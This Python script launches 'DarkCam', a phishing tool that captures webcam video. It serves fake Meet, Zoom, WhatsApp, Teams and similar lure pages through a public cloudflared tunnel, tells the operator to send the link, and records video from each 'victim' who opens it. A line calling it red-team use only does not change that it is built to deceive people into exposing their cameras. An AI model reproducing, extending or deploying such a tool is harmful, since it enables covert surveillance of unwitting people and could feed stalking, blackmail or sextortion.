#!/usr/bin/env python3
"""
DarkCam — Webcam Video Capture Tool for Authorized Red Team Engagements
Usage: python3 darkcam.py [--page meet|zoom|whatsapp|...] [--port 8080] [--duration 45]
"""

import os
import sys
import time
import argparse
import subprocess
import threading
import signal

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "-q"])
    from colorama import Fore, Style, init
    init(autoreset=True)

BANNER = f"""
{Fore.RED}
  ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ █████╗ ███╗   ███╗
  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗████╗ ████║
  ██║  ██║███████║██████╔╝█████╔╝ ██║     ███████║██╔████╔██║
  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║     ██╔══██║██║╚██╔╝██║
  ██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╗██║  ██║██║ ╚═╝ ██║
  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}  [ Webcam Video Capture Framework | Authorized Red Team Use Only ]{Style.RESET_ALL}
{Fore.RED}  [ By: Yaman RedTeam | v1.0.0 ]{Style.RESET_ALL}
"""

def check_cloudflared():
    result = subprocess.run(["which", "cloudflared"], capture_output=True)
    if result.returncode != 0:
        print(f"{Fore.YELLOW}  [!] cloudflared not found. Installing...{Style.RESET_ALL}")
        arch = subprocess.check_output(["uname", "-m"], text=True).strip()
        binary = "cloudflared-linux-arm64" if "arm" in arch or "aarch" in arch else "cloudflared-linux-amd64"
        subprocess.run(
            f"curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/{binary} "
            f"-o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared",
            shell=True, check=True
        )
        print(f"{Fore.GREEN}  [+] cloudflared installed.{Style.RESET_ALL}")

def start_tunnel(port: int) -> str:
    """Start cloudflared tunnel and return the public URL."""
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    url = None
    import re
    # URL appears in stderr
    def read_stderr():
        nonlocal url
        for line in proc.stderr:
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                break

    t = threading.Thread(target=read_stderr, daemon=True)
    t.start()
    t.join(timeout=20)
    return url, proc

def start_flask(page: str, port: int):
    """Start Flask server in a thread."""
    import server as srv
    srv.app.config["LURE_PAGE"] = page

    def run():
        srv.app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(1.5)  # let flask boot

def print_info(url: str, page: str, port: int, duration: int):
    print(f"\n{Fore.CYAN}  ╔══════════════════════════════════════════════╗")
    print(f"  ║              CAMTRAP ACTIVE                  ║")
    print(f"  ╚══════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Lure Page   : {Fore.YELLOW}{page.upper()}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Local URL   : http://localhost:{port}")
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Public URL  : {Fore.CYAN}{url}{Style.RESET_ALL}  ← Send this")
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Output Dir  : {os.path.abspath('output/')}")
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Rec Duration: {duration}s per victim")
    print(f"\n  {Fore.RED}[!]{Style.RESET_ALL} Waiting for victims... (Ctrl+C to stop)\n")
    print(f"  {'─'*50}")

def main():
    parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool")
    parser.add_argument("--page", choices=["meet", "zoom", "whatsapp", "instagram", "omegle", "teams", "telegram", "facetime"], default="meet", help="Lure page template")
    parser.add_argument("--port", type=int, default=8080, help="Local server port")
    parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
    parser.add_argument("--no-tunnel", action="store_true", help="Skip cloudflared, use local only")
    args = parser.parse_args()

    print(BANNER)

    # install deps
    print(f"  {Fore.YELLOW}[*]{Style.RESET_ALL} Checking dependencies...")
    req_path = os.path.join(os.path.dirname(__file__), "requirements.txt")
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", req_path, "-q", "--break-system-packages"], check=True)

    if not args.no_tunnel:
        check_cloudflared()

    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Starting Flask server on port {args.port}...")
    start_flask(args.page, args.port)
    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Flask server running.")

    tunnel_proc = None
    public_url = f"http://localhost:{args.port}"

    if not args.no_tunnel:
        print(f"  {Fore.YELLOW}[*]{Style.RESET_ALL} Starting cloudflared tunnel...")
        public_url, tunnel_proc = start_tunnel(args.port)
        if not public_url:
            print(f"  {Fore.RED}[-]{Style.RESET_ALL} Could not get tunnel URL. Use --no-tunnel for local only.")
            sys.exit(1)

    print_info(public_url, args.page, args.port, args.duration)

    def cleanup(sig=None, frame=None):
        print(f"\n\n  {Fore.YELLOW}[!]{Style.RESET_ALL} Shutting down CamTrap...")
        if tunnel_proc:
            tunnel_proc.terminate()
        print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} DarkCam stopped. Captured files saved in: output/")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
